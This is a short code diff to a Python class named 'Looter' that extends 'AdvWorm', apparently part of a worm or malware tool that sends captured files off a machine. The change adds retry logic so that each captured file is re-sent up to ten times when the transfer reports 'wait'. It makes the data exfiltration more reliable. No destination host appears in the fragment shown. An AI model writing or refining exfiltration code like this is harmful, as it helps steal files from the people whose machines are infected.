@@ -57,7 +57,16 @@ class Looter(AdvWorm):
         self.sendMsg(f"Start sending {len(self.tooCapture)} files")
         sleep(1)
         for ts in self.tooCapture:
-            self.sendFile(ts[0], ts[1], dirIndex)
+            count = 0
+            while count < 10:
+                sending = self.sendFile(ts[0], ts[1], dirIndex)
+                if sending == "wait":
+                    count += 1
+                    sleep(self._pauseSend)
+                    continue
+                else:
+                    break
+
         sleep(0.5)
         
     
